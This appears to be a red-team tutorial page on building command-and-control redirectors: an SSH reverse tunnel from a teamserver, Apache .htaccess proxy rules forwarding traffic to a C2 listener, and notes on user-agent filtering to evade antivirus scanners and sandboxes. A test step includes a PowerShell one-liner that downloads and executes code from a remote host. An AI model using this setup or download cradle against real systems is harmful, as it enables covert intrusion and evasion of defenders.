# Redirectors & Enabling Apache Redirection

## Redirectors

It's important to never store any data on a redirector, traffic should only transmit through it.&#x20;

* We can setup an SSH or VPN tunnel from the C2 server to the HTTP redirector. We want it done this way so no sensitive private keys or credentials for the C2 server on our redirector.

## Install Apache

Follow the guide [here](https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache) to install apache.

## Setup SSH Reverse Tunnel

We need to create a reverse SSH tunnel from our team server to our redirectors.

```sh
attacker@teamserver ~> ssh -N -R 8443:localhost:443 attacker@10.10.0.100
```

#### Test SSH tunnel

```sh
attacker@redictor curl -v https://localhost:8443/r1
```

Note: If we are receiving certificate errors from the above command, we'll need to add the .crt to our trusted certificates in `/usr/local/share/ca-certificates` and run **`update-ca-certificates`**`.`

```
scp localhost.crt attacker@10.10.0.100:/home/attacker/
```



## Enable Apache Redirection

Once we have established an SSH tunnel to our redirector running apache, we can begin to configure apache to proxy traffic to through to our C2 listener.

### Editing .htaccess

`.htaccess`is the configuration file used for redirection, amonst others. To enable .htaccess we can modify `/etc/apache2/sites-enabled/default-ssl.conf`.

Under `</VirtualHost>` tag, add a new `<Directory>` with the following:

```sh
<Directory /var/www/html/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Require all granted
</Directory>
```

* Add`SSLProxyEngine on` underneath `SSLEngine on`, and restart apache.
* Create a new `.htaccess` file in the apache web root`/var/www/html` with the following:

```sh
RewriteEngine on
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]
```

### Testing apache redirection

We can execute the following and check the response in our teamserver.

```sh
curl https://copperwired.com/test
```

```sh
PS C:\Users\bob> iex (new-object net.webclient).downloadstring("https://www.copperwired.com/a")
```

\


## User Agent Redirection

A powerful technique we can use is to redirect content based on the clients user agent, we can block known AV scanners, sandboxes, and unauthorized viewers.
